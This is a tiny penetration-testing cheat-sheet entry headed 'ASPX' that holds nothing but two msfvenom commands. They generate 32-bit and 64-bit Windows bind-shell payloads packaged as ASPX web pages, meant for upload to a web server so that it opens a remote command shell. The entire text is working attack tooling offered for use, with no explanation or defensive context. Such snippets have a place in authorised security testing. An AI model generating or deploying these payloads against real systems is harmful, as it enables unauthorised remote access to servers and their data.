# ASPX

`$ msfvenom -p windows/shell/bind_tcp lport=<PORT> -f aspx -o shell-x86.aspx`

`$ msfvenom -p windows/x64/shell_bind_tcp lport=<PORT> -f aspx -o shell-x64.aspx`